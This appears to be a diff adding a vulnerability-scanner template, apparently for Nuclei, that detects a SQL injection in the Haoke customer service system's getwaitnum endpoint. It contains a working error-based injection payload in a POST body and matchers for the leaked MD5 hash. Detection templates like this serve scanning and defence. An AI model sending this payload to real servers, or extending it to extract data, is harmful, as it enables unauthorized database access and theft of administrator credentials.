@@ -1,0 +1,29 @@
+id: haoke-customer-service-sql-injection
+info:
+  name: Haoke Customer Service System SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The Haoke customer service system has a SQL injection vulnerability in the `getwaitnum` endpoint. This allows attackers to obtain full database information and administrator account passwords.
+  tags: sql-injection
+  impact: |
+    Exploitation of this vulnerability can lead to unauthorized access to sensitive database information and administrator credentials.
+  reference:
+    - https://mp.weixin.qq.com/s/DXG228VhQVSCVVn2aeePOQ
+http:
+  - method: POST
+    path:
+      - "/admin/event/getwaitnum"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      business_id[]=exp&business_id[]=+and+(select 1 from (select count(*),concat((select md5(123)),floor(rand(0)*2))x from information_schema.tables group by x)a)&groupid=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "202cb962ac59075b964b07152d234b701"
